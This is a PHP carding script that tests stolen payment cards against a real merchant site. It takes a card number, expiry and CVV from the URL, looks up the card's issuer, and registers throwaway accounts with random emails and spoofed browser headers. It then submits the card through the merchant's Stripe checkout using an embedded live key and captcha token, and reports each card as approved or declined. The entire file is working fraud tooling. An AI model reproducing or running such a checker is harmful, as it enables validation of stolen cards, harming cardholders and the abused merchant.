<?php
error_reporting(1);
set_time_limit(0);

$email = 'savefullblack'.rand(10, 100000).'%40gmail.com';
$useragent = "Mozilla/5.0 (Windows NT " . rand(6, 10) . ".0; Win64; x64) AppleWebKit/" . rand(500, 600) . ".0 (KHTML, like Gecko) Chrome/" . rand(100, 120) . ".0." . rand(4000, 5000) . "." . rand(100, 300) . " Safari/" . rand(500, 600) . ".0";

function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$lista = $_GET['lista'];
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$mes2 = (string)((int)$mes);
$ano = $separar[2];
$ano2 = substr($ano, -2);
$cvv = $separar[3];

if (file_exists("savefullblack.txt")) {
    unlink("savefullblack.txt");
}

$bin = substr($cc, 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.savefull.black/bin/' . $bin);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$lofy = curl_exec($ch);
$pais = getStr($lofy, '"ISO": "', '"');
$bandeira = getStr($lofy, '"Bandeira": "', '",');
$tipo = getStr($lofy, '"Tipo": "', '",');
$nivel = getStr($lofy, '"Nivel": "', '"');
$banco = getStr($lofy, '"Banco": "', '",');
$info = strtolower("$bandeira $banco $tipo $nivel ($pais)");

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://legacygames.com/my-account/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/savefullblack.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/savefullblack.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept-language: pt-BR,pt;q=0.5',
'user-agent: ' . $useragent
));
$get_reg_nonce = curl_exec($ch);
$reg_nonce = getStr($get_reg_nonce, 'name="woocommerce-register-nonce" value="', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://legacygames.com/my-account/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/savefullblack.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/savefullblack.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept-language: pt-BR,pt;q=0.5',
'user-agent: ' . $useragent
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'username=' . $email . '&email=' . $email . '&password=adasdasdadasdsadada2512&promo_referral_name=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Flegacygames.com%2Fmy-account%2F&wc_order_attribution_session_start_time=2025-08-15+02%3A01%3A07&wc_order_attribution_session_pages=1&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F138.0.0.0+Safari%2F537.36&woocommerce-register-nonce=' . $reg_nonce . '&_wp_http_referer=%2Fmy-account%2F&register=Register');
$register = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://legacygames.com/my-account/add-payment-method/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/savefullblack.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/savefullblack.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept-language: pt-BR,pt;q=0.5',
'user-agent: ' . $useragent
));
$checkout = curl_exec($ch);
$ajax_nonce = getStr($checkout, '"createAndConfirmSetupIntentNonce":"', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/savefullblack.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/savefullblack.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: application/x-www-form-urlencoded',
'user-agent: ' . $useragent
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]=' . $cc . '&card[cvc]=' . $cvv . '&card[exp_year]=' . $ano2 . '&card[exp_month]=' . $mes . '&allow_redisplay=unspecified&billing_details[address][country]=BR&pasted_fields=number&payment_user_agent=stripe.js%2F0f795842d4%3B+stripe-js-v3%2F0f795842d4%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Flegacygames.com&time_on_page=90319&client_attribution_metadata[client_session_id]=a46d4df4-b4c3-4882-9fc1-568f149189fb&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=e699055b-9828-480e-9dd7-cdc1335896d5&guid=NA&muid=NA&sid=NA&key=pk_live_51H2KFNGxiXToSgUABz7o7Y57zaHbmaYs5GQS80fk2GNBI3uUjZ3Dvgh4wptaQnuIsOIJ9hoYzAT7zZ7s5jZVj1AB00qFH2vEZs&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzU1MjIzODIwLCJjZGF0YSI6InlEQi9NYUU0R2swQis1VVpWQ3JZeGFucjB2YjFXUlpUczd4U1hUdzc2MjNLeFBVdVovQnE5VEFOZlRxNm1GczZmTEpVcFhwUmVBWncvMlBFTFRGaWpiUEFFQ2VvV08vc3VSNEZvVGFnQi94UGg1TjFYa3Z1TUgxZG4vbTJBd1RmQnJ3b3NBMzJxcyt4dXkzUXYrSEhWZTB6UGxpZnJvTXNiZzZoY0VZdXpwR09YK3d1MlFOa0s0TXorWmFXS2ExZ05YMjdMdVlJTU5hcWowWHQiLCJwYXNza2V5IjoiUmliM0Vpa2tBVndIVUJuTldiNG9aNFdkTU1YZGJYLzhiNVZqUE15THJzNGxwQkVQT0NsenRRRVlyMHdQZ3NNMmVkdm5MRDZoYWozUUhLdWlZMjlYWm5wQjFKMzJIVlc1aFA4S013STlyZjlKVDJwY29OT1FxK3BlT0ZYdkx2K0VEUElkdjlLa25mRUxKT3FHbUtuL3YvSDYzN0l1ODJuQnVTU0xJSUlCOGxmTW9tRDlaYUhVODRKVE52SzJYMmJ3aUtPQWxoVktEanhXeHFGQ1FLR1FoZXYrOW5MaFR2ejNsM0FSSGE3L1ZnYlFWRXd0aXl4V1J6L3FTRUd6R1R5dll6ZnFSMWJCSDRzT2wrSWlTclI4MkgyM2RBTkRTWEdnN0c5S3EyQWNISk1hbEYrMkp5OS9paGFKZnZiaVY4RnY1ZC9Ob2ZIOVhPd1QwY0ZhMVJsVTVUOFNGTUtKbk1kS2ZXS1RNOGt1QWtUbFRHNU5rOTF4VS9UV3k0ZzlHaWNkblpoTGw0NjQ0c3U4ZzNPUnByaHBpdTN0cGFJbnNnazQ4eHRaemVyZFp6ZFpzN0s4bjJlSy81d3R4UDVJaVZvOFROcXowUzlsQ1VwT2hyOWU0c05VYVZzZjRPKytyTXY2SFlYWm9hWkp5U2plcVBucXZqTVRxWjRjMWpwM25KUDFVN2hVcXpCZWc2M3ZCTC9NRWExSkhDRTRSYUlnTjhuODMwd0RKNi9kWlo4cTFNU29ueUpRcGU5dU9HQTFSUkd4K2FQZ1NVVDNyNkZnWHFCNmtNUVFEenRzd3VDbEY1YmlIQU8wNytrblJMbDcrQWllQlQ0bWNKUVJFMmFmOFUwTW1nSUdrNnk0MWFNTHlFQUNBVGNXcTJIdlJpaWZTTmlKc0NmUlk4UGxyNHVZR3diTkIwa29BSDkxRTlnN0RMTUhSU2hWK3MwQWlBelN4bUtwbDkzbVVybitteklOM3Q5RWc1TjZxSW12WVJIb2cxKzJXQVIrd3hGZVZva0NpMjYyWlFFZ2o2WTJBS0ZLWUlDSDNERy94T21TemtSMjBDU1BqUE1PTEhBZERWV2ZOeHlRYmZKQndteU0xeDZUbU12K2xlV3hHYkZ0UGIvSjNkUDFtZEgyZGphdVMyUXgvaS9ZOG1BQ3BDZHZQU0JYRjZYTkZROVI0U1dXSXNVSHdHTzQvQTd3R1BTTlV5Z0IzV0VWTzkyVDFhSWxhbU9jZnUxd3FvTjBJaFIvSWlmdjc4elEzcG5kZnAzazliYVVYOFpmcGt3NGZNRVpUR0pZK3VsYjN2Zkpic0lvaURSYWpXWDBlSTI5OWZYSE5zVW1qTkc2NXk5WCtoZjJsTFFmbEJZYUREenFSVk1tWXE3eHQ1TXVDVzQ5T09zMmZzaVNrZlNMWS9wbDJRQ3NKMDJkWGtOblFDd1ZvZnRSWUovMzErWldKZHhkMkNOdkJGeGlUNHZJWjNJUVVaUDJCRnFHWWVscjBvdENxMEd2SDVwbGxuYytHcWovbGs0aEZUSG15TlVxTGMzbnQ2RG5jNkVZU1JndHE4UEhKc1h3a1ZlN3h4TVJhNEUyRnMra2VlT3FaamVnVElDOXI1cE5DeStZR0VoYVdhVFVIb1VqOHFZS0lzWmVuZnpxZ0xEdWFnMysxRjNxL05Ldm0wRCs0LzQ4Z2RxRTF2QjJGVTkxdzBENktSOE9tYzlBbUF2T0pCQTFaNkJ6MmpYQnQvL2NsWW9QdXM0eWpzVUxpdEp2VFAxYk15SDZReG5pQ0kyZTlZR3pib3YydngzMG5yV1pzVHZwbkhSbGpIUDVxVUNlbWxZYUpYSjhuMkN1UnkyeUpIZThWS3VSamlGRk0zaUszQk5EN3NyS0t5RmNhRmxXaUJ6Q0ZJUllKWVY1WTRsYnV3U2plODdiNVZiWnZIS0hHdXAzMHBHWkoxNGZ0U2JxTWJQL2d5anM0ZHBvOE1vdjI5UFBFTk1EeHo4dUQ3enhUYjI3MTJySDRMei9hS01xV3BDdEdXMDJzOGx5YUlweTBSZEdYVGo0K1VSOGZLYXc2b0VERXNyOUJDRCt3NGV5Y0VXVHJXeVFEU283cW1lejFUb0xZRnpQTWV3SUdsTWF4eStrT1FtdlpiYnI1YWRKSE91ZExrQzdkZFFmdzROaTBMbFd0d20zbytsRjV3ZVBaaGVsVTJxTHZZdUE2Wm9iOTlidXVLRmpJeS9zMlMyYkI5SXZ4WjVjelJBV2FuVFFzQlNLbXFUVnQzVWtoZDFkZFVFdDFydXN4aUJoMjRDTHFpM2p1ZFgzIiwia3IiOiIyOTQzOWU5Iiwic2hhcmRfaWQiOjcxNzcxNTM3fQ.XVi7ULGPtACxpv77CBdneOZm5-aZtEBJUtNc_WnRK8w');
$token = curl_exec($ch);
$id = getStr($token, '"id": "', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://legacygames.com/my-account/?wc-ajax=wc_stripe_create_and_confirm_setup_intent');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/savefullblack.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/savefullblack.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept-language: pt-BR,pt;q=0.5',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'user-agent: ' . $useragent
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=create_and_confirm_setup_intent&wc-stripe-payment-method=' . $id . '&wc-stripe-payment-type=card&_ajax_nonce=' . $ajax_nonce . '');
echo $resultado = curl_exec($ch);
$retorno = getstr($resultado, '"message":"', '"');






if(strpos($resultado, '"success":true') !== false) {
  echo '<span class="badge badge-success">✅ #Aprovada </span> » [' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '] » [' . $info . '] <span class="badge badge-success">[ AUTHORIZED ] #SaveFullBlack</span><br>';

}else{
  echo '<span class="badge badge-danger">🧨 #Reprovada </span> » [' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '] » [' . $info . '] » <span class="badge badge-danger">[ ' . $retorno . ' ] #SaveFullBlack</span><br>';
}

// Criado por @savefullblack e @tropadoreiofc
?>